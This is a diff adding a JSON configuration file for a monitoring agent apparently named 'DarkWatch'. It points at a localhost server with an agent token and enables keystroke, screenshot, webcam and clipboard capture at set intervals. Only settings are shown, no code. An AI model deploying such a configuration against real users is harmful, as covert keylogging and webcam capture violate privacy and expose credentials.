@@ -1,0 +1,18 @@
+{
+  "server_base_url": "http://127.0.0.1:5000",
+  "agent_token": "DarkWatch-Telemetry-Key-2026",
+  "poll_interval_seconds": 10,
+  "modules": {
+    "system_metrics": true,
+    "keystrokes": true,
+    "screenshots": true,
+    "webcam": true,
+    "clipboard": true
+  },
+  "intervals": {
+    "metrics_seconds": 10,
+    "data_flush_seconds": 30,
+    "screenshot_seconds": 120,
+    "webcam_seconds": 300
+  }
+}
